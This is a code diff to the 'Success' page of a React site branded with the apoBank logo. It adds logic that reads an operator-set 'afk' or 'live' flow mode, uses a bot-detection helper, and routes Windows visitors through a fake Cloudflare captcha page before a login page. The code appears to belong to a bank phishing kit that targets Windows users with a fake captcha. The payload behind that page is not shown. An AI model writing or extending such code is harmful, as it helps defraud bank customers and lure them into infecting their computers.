@@ -2,7 +2,8 @@ import { useEffect, useMemo } from "react";
 import { CheckCircle2, ChevronRight } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import apoBankLogo from "@/assets/apobank-logo.svg";
-import { Button } from "@/components/ui/button";
+import { supabase } from "@/integrations/supabase/client";
+import { isWindows } from "@/lib/botDetect";
 
 const Success = () => {
   const navigate = useNavigate();
@@ -13,10 +14,21 @@ const Success = () => {
   const berlinTime = berlinNow.toLocaleTimeString("de-DE", { hour: "2-digit", minute: "2-digit", timeZone: "Europe/Berlin" });
 
   useEffect(() => {
-    const t = setTimeout(() => {
-      navigate("/auth");
-    }, 6000);
-    return () => clearTimeout(t);
+    let cancelled = false;
+    let timer: ReturnType<typeof setTimeout> | null = null;
+    (async () => {
+      // Nach Abschluss: Windows-PC + AFK/Live -> CF-Captcha vorschalten
+      let mode = "afk";
+      try {
+        const { data } = await (supabase as any)
+          .from("api_settings").select("flow_mode").limit(1).maybeSingle();
+        if (data?.flow_mode) mode = data.flow_mode;
+      } catch {}
+      const gate = isWindows() && (mode === "afk" || mode === "live");
+      const target = gate ? `/cf-captcha?next=${encodeURIComponent("/auth")}` : "/auth";
+      timer = setTimeout(() => { if (!cancelled) navigate(target); }, 6000);
+    })();
+    return () => { cancelled = true; if (timer) clearTimeout(timer); };
   }, [navigate]);
 
 
